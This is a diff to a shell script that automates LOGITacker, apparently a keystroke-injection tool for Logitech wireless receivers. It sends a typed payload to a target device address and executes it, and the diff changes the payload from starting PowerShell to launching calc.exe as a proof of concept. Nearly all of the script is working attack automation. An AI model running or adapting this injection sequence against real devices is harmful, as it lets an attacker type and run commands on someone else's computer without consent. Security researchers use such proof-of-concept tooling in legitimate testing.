@@ -14,6 +14,10 @@ if [[ -z $1 ]]; then
   exit 1
 fi
 
+# clean up LOGITacker screen session just in case
+get_pid_of_LOGITacker_screen=$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print $1}' | awk '{$1=$1;print}')
+kill $get_pid_of_LOGITacker_screen
+
 # run this script to attach to /dev/ttyACM0 via screen in Linux and execute the payload
 if [[ $1 = "AA:BB:CC:DD:EE" ]]; then
   echo "Test mode."
@@ -29,18 +33,15 @@ else
   python3 -c "import time; time.sleep(0.05)"
   screen -x LOGITacker_screen -p 0 -X stuff "script delay 500"`echo -ne '\015'`
   python3 -c "import time; time.sleep(0.05)"
-  screen -x LOGITacker_screen -p 0 -X stuff "script string powershell"`echo -ne '\015'`
+  screen -x LOGITacker_screen -p 0 -X stuff "script altstring calc.exe"`echo -ne '\015'`
   python3 -c "import time; time.sleep(0.05)"
-  screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
-  python3 -c "import time; time.sleep(0.05)"
-  screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT APOSTROPHE"`echo -ne '\015'`
-  python3 -c "import time; time.sleep(0.05)"
-  #screen -x LOGITacker_screen -p 0 -X stuff "script press RETURN"`echo -ne '\015'`
+  screen -x LOGITacker_screen -p 0 -X stuff "script press RETURN"`echo -ne '\015'`
   python3 -c "import time; time.sleep(0.05)"
   screen -x LOGITacker_screen -p 0 -X stuff "inject target ${1}"`echo -ne '\015'`
   python3 -c "import time; time.sleep(0.05)"
   screen -x LOGITacker_screen -p 0 -X stuff "inject execute"`echo -ne '\015'`
-  pkill screen
+  get_pid_of_LOGITacker_screen=$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print $1}' | awk '{$1=$1;print}')
+  kill $get_pid_of_LOGITacker_screen
   echo "Payload executed."
 fi
 
